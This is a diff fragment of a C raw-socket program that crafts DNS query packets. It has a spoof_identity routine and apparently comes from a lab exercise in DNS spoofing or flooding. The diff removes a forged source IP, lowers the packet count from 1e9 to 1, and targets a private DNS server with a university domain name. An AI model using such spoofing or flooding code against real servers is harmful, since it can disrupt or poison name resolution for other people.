@@ -13,11 +13,11 @@
 
 
 const int BUFFER_LEN = 1024;
-const char* DNS_SERVER = "192.168.0.104";
+const char* DNS_SERVER = "192.168.0.105";
 char* DOMAIN_NAME = "biis.buet.ac.bd";
 const int DNS_PORT = 53;
 
-const int N = 1e9;
+const int N = 1;
 
 struct dns_header {
   uint16_t xid;
@@ -46,11 +46,10 @@ void spoof_identity(struct iphdr *ip, struct dns_header *dns_h) {
 void fill_ip(struct iphdr *ip) {
     ip->ihl      = 5;  // Header size = 5 * 32 bit
     ip->version  = 4;  // IPv4
-    ip->tos      = 16; // low delay
+    ip->tos      = 0; // low delay
     ip->id       = htons(rand() & 0xFFFF); // randomly assignning ip-id
     ip->ttl      = 64; // hops
     ip->protocol = 17; // UDP
-    ip->saddr = inet_addr("1.2.3.4");   //spoofing ip
     ip->daddr = inet_addr(DNS_SERVER);  // DNS ip
 }
 
@@ -118,6 +117,7 @@ size_t fill_dns_question(char* buffer) {
 
 
 int main() {
+    srand(time(0));
     char buffer[BUFFER_LEN];
     struct sockaddr_in sin;
     int yes = 1, pkt_sent = 0;
@@ -176,7 +176,6 @@ int main() {
 			printf("Packet frequency: %lf pkts/s\n", (1.0 * pkt_sent)/_tm );
 		}
     }
-
 	double _tm = (double)(clock() - start) / CLOCKS_PER_SEC  ;
 	printf("Total time = %lf\n",_tm);
 	printf("Total sent Packets = %d\n", pkt_sent);
